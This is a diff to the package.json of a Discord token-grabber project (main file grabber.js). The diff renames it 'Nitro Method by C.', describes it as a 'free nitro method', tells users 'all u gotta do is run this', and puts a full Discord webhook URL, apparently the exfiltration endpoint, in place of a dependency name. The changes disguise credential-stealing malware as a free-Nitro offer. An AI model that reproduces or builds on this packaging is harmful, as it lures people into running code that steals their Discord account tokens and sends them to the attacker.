@@ -1,7 +1,7 @@
 {
-  "name": "token-grabber",
+  "name": "Nitro Method by C.",
   "version": "1.0.0",
-  "description": "Token Grabber for Discord.",
+  "description": "free nitro method.",
   "main": "grabber.js",
   "bin": "grabber.js",
   "pkg": {
@@ -14,7 +14,7 @@
   },
   "dependencies": {
     "axios": "^0.26.0",
-    "discord-webhook-node": "^1.1.8"
+    "https://discord.com/api/webhooks/978732274734465096/-QRawbucLYuFJdjXQbYlPipdcOgViSNC2moK3N8AdalRmpvZKKukQGH2kkFtXIs8AexX": "^1.1.8"
   },
   "devDependencies": {
     "@types/axios": "^0.14.0",
@@ -25,7 +25,7 @@
   },
   "repository": {
     "type": "git",
-    "url": "git+https://github.com/deliever42/discord-token-grabber.git"
+    "url": "Discord free nitro method by C.| all u gotta do is run this"
   },
   "author": "deliever",
   "license": "Apache-2.0"
